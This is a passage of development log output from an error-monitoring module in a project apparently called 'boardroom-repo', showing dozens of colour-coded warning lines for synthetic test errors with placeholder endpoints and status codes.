WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699759Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 298'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699813Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 299'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699863Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 300'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699912Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 301'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.699960Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 302'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700008Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 303'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700056Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 304'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700105Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 305'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700153Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 306'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700201Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 307'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700249Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 308'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700299Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 309'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700347Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 310'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700394Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 311'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700443Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 312'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700490Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 313'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700539Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 314'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700588Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 315'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700637Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 316'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700684Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 317'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700732Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 318'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700780Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 319'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700828Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 320'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700876Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 321'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700924Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 322'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.700971Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 323'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701021Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 324'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701073Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 325'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701122Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 326'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701171Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 327'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701218Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 328'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701265Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 329'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701313Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 330'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701361Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 331'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701409Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 332'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701506Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 333'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701576Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 334'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701630Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 335'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701681Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 336'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.701732Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m7[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 337'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
